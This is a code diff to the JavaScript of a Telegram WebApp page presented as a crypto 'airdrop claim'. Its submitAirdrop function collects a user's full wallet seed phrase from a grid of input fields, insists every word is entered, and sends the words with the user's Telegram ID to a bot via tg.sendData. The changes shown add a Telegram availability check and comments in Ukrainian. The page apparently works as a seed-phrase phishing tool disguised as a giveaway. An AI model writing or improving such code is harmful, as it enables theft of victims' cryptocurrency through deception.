@@ -100,12 +100,21 @@ function clearWarning() {
 }
 
 function submitAirdrop() {
-    const tg = window.Telegram.WebApp;
+    // 🔐 Перевірка, що WebApp API Telegram доступний
+    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
+        alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
+        return;
+    }
+
+    // ✅ Ініціалізація WebApp
+    const tg = Telegram.WebApp;
     tg.ready();
 
+    // 🔎 Отримання seed-фраз
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
     const words = inputs.map(input => input.value.trim()).filter(word => word !== '');
 
+    // ⚠️ Перевірка на повне заповнення
     if (words.length !== inputs.length) {
         const warning = document.getElementById('validationWarning');
         warning.innerText = 'Пожалуйста, заполните все поля.';
@@ -113,6 +122,7 @@ function submitAirdrop() {
         return;
     }
 
+    // 📦 Формування payload
     const payload = {
         event: "airdrop_claim",
         user_id: tg?.initDataUnsafe?.user?.id || "-",
@@ -122,7 +132,12 @@ function submitAirdrop() {
         wallet: document.getElementById("wallet").value
     };
 
+    // 🧾 Вивід у консоль для дебагу
     console.log("[📤 Отправка]", payload);
+
+    // 🚀 Надсилання у Telegram-бот
     tg.sendData(JSON.stringify(payload));
-    tg.close(); // WebApp автоматично закриється
+
+    // ❌ Закриття WebApp
+    tg.close();
 }
